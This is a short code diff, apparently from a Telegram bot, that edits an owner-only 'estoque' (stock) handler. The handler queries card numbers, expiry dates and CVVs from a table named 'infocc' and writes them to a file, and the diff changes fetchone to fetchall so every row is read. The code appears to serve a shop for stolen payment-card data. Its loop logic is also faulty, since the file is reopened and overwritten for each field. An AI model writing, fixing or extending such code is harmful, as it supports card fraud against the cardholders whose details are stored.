@@ -161,7 +161,7 @@ def document(message):
 def estoque(message):
   if message.from_user.id == 1869219363:
     cursor.execute("SELECT cartao, data, cvv FROM infocc")
-    for u in cursor.fetchone():
+    for u in cursor.fetchall():
       for cartao in u:
         with open('estoque.txt', 'w') as i:
           i.write(cartao)
